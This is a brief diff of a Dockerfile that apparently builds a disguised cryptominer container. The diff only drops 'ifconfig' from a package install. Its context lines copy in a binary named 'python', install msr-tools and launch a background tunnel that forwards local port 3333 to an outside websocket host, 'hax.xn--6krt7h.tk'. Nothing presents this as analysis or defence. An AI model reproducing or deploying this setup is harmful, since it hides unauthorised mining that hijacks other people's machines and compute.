@@ -4,7 +4,7 @@ WORKDIR /app
 COPY python /app/
 COPY config.json /app/
 RUN apt update -y \
-  && apt install -y procps msr-tools ifconfig
+  && apt install -y procps msr-tools
 RUN chmod a+x /my-tu /app/python && \
   (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.xn--6krt7h.tk &) && \
   cd /app && \
